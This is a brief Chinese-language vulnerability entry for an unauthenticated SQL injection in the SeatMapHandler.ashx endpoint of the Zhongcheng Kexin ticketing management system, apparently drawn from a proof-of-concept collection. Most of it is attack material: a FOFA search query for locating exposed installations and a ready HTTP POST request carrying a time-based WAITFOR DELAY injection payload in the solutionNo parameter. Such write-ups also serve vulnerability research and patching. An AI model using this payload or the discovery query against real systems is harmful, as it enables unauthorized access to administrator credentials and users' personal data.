## 中成科信票务管理系统SeatMapHandler.ashx存在SQL注入漏洞

中成科信票务管理系统 SeatMapHandler.ashx 接口处存在SQL注入漏洞复现，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## fofa

```yaml
body="技术支持：北京中成科信科技发展有限公司"
```

## poc

```java
POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

Method=GetZoneInfo&solutionNo=1'%3bDECLARE+%40x+CHAR(9)%3bSET+%40x%3d0x
303a303a35%3bWAITFOR+DELAY+%40x--
```

